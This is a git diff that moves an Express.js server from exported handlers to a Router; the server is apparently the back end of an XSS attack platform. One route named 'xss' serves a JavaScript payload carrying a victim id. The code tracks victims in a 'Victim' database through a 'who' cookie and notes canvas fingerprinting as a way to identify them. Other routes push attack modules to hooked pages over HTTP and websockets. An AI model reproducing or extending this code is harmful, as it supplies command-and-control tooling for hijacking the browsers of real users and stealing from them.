@@ -1,14 +1,16 @@
-//  ALL     /
-exports.xss = function(req, res){
+var express = require('express'),
+    router = express.Router();
+
+router.all('/', function(req, res){
     res.header('Content-Type', 'application/javascript');
     return res.render('love', {
-        protocol:'',
-        host:req.header('host'),
+        protocol:config.ssl?'':'http',
+        host:config.host||req.header('host'),
         id:req.query.i
     });
-};
-//  ALL     /i/
-exports.load = function(req, res){
+});
+
+router.all('/i/', function(req, res){
     //  XXX who id use "Canvas Fingerprinting"
     var id = req.param('i');
     var who = req.cookies.who;
@@ -37,7 +39,7 @@ exports.load = function(req, res){
             });
         });
     });
-};
+});
 
 function online(who, on){
     sql.Victim.findOne({who:who}, function(err, info){
@@ -60,9 +62,7 @@ function handle(req, res, modules, owner, victim, who, type){
     };
 };
 
-//  ALL     /h/:uri
-//  ALL     /home/page/:uri
-exports.http = function(req, res){
+var http = function(req, res){
     var pageid = req.params.uri;
     var who = req.cookies.who;
     sql.Page.findOne({uri:pageid}, function(err, info){
@@ -72,9 +72,10 @@ exports.http = function(req, res){
         handle(req, res, info.modules, owner, sql.Victim, who, 'http');
     });
 };
-//  ALL     /h/:uri
-//  ALL     /home/page/:uri
-exports.ws = function(ws, req){
+router.all('/h/:uri', http);
+router.all('/home/page/:uri', http);
+
+var hws = function(ws, req){
     var pageid = req.params.uri;
     var who = req.cookies.who;
     sql.Page.findOne({uri:pageid}, function(err, info){
@@ -91,3 +92,7 @@ exports.ws = function(ws, req){
         });
     });
 };
+router.ws('/h/:uri', hws);
+router.ws('/home/page/:uri', hws);
+
+module.exports = router;
